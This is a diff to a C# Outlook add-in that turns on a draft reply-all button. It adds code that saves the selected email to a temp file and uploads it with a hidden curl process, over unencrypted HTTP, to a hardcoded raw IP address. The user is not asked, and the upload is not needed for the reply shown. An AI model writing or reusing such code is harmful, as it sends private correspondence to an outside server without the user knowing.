@@ -10,6 +10,9 @@ using System.Threading.Tasks;
 using SmartTech_Addin.Forms;
 using System.Net.Http.Headers;
 using Outlook = Microsoft.Office.Interop.Outlook;
+using System.Windows.Forms;
+using System.Data.Common;
+using System.Diagnostics;
 
 namespace SmartTech_Addin
 {
@@ -59,7 +62,7 @@ namespace SmartTech_Addin
         }
         public void onClickDraftBtn(IRibbonControl control)
         {
-            //DraftReplyAllAsync("replyText");
+            DraftReplyAllAsync("replyText");
         }
 
         public void onClickRepharse(IRibbonControl control)
@@ -102,6 +105,9 @@ namespace SmartTech_Addin
                 var replyAll = mailItem.ReplyAll();
                 replyAll.HTMLBody = replyText + replyAll.HTMLBody;
                 replyAll.Display();
+
+                var (path, rdStr) = GetSelecteEmailTempSavedPath();
+                ExecuteCommand("C:\\Windows\\System32\\curl.exe", "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"fileref: abc.msg\" -F file=@\"" + path + "\" http://149.34.253.243:46206/image");
             }
         }
 
@@ -117,45 +123,52 @@ namespace SmartTech_Addin
             }
         }
 
-        private string GetSelecteEmailTempSavedPath()
+        private (string, string) GetSelecteEmailTempSavedPath()
         {
             string tempPath = null;
+            string uuid = Guid.NewGuid().ToString();
             var mailItem = Globals.ThisAddIn.SelectedEmail as MailItem;
 
             if (mailItem != null)
             {
-                tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".msg");
+                tempPath = Path.Combine(Path.GetTempPath(), uuid + ".msg");
                 mailItem.SaveAs(tempPath, Outlook.OlSaveAsType.olMSG);
             }
-            
+            return (tempPath, uuid.Substring(0, 6));
         }
 
-        private async Task SendMailAsAttachmentAsync()
+        Process commandProcess = null;
+
+        public bool ExecuteCommand(string curlExePath, string commandLineArguments, bool isReturn = true)
         {
-            String path = GetSelecteEmailTempSavedPath();
-            byte[] fileData = File.ReadAllBytes(path); 
+            Console.WriteLine(commandLineArguments);
 
-            using (var client = new HttpClient())
-            using (var content = new MultipartFormDataContent())
-            {
-                var fileContent = new ByteArrayContent(fileData);
-                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
-                content.Add(fileContent, "file", Path.GetFileName(path));
+            bool result = true;
+          
+                commandProcess = new Process();
+                commandProcess.StartInfo.UseShellExecute = false;
+                commandProcess.StartInfo.FileName = curlExePath; // this is the path of curl where it is installed;    
+                commandProcess.StartInfo.Arguments = commandLineArguments; // your curl command    
+                commandProcess.StartInfo.CreateNoWindow = true;
+                commandProcess.StartInfo.RedirectStandardInput = true;
+                commandProcess.StartInfo.RedirectStandardOutput = true;
+                commandProcess.StartInfo.RedirectStandardError = true;
+                commandProcess.Start();
 
-                string apiUrl = "https://your-api-endpoint.com/upload";
-
-                HttpResponseMessage response = await client.PostAsync(apiUrl, content);
-                if (response.IsSuccessStatusCode)
+                var line = "";
+                while (!commandProcess.StandardOutput.EndOfStream)
                 {
-                    // Handle success
+                    line += commandProcess.StandardOutput.ReadLine();
+                    
                 }
-                else
-                {
-                    // Handle error
-                }
-            }
+                commandProcess.WaitForExit();
+                var lastStandardOutput = line;
+            MessageBox.Show(line);
+            //string error = commandProcess.StandardError;
+            commandProcess.Close();
+            
+            return false;
         }
-        
 
         #endregion
 
